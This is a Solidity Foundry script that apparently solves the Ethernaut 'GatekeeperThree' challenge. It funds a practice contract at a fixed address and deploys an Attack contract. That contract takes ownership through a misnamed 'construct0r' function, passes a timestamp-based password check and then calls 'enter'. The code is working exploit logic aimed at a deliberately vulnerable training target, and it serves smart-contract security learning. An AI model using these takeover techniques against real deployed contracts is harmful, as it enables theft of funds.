// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {GatekeeperThree} from "../src/GatekeeperThree.sol";

contract GatekeeperThreeScript is Script {

    function setUp() public {}

    function run() public {
        address payable targetAddr = payable(0xdE7138c2ECC076BAC12855C741a7955d0d1bb514);

        vm.startBroadcast();

        (bool okFund, ) = targetAddr.call{value: 0.002 ether}("");
        require(okFund, "funding target failed");

        Attack attack = new Attack(targetAddr);
        attack.attack();

        vm.stopBroadcast();
    }
}

contract Attack {
    address payable public target;

    constructor(address payable _target) {
        target = _target;
    }

    function attack() public {
        GatekeeperThree gate = GatekeeperThree(target);

        // escape gate 1
        gate.construct0r();

        // escape gate 2
        gate.createTrick();
        gate.getAllowance(block.timestamp);

        // escape gate 3
        gate.enter();
    }
}
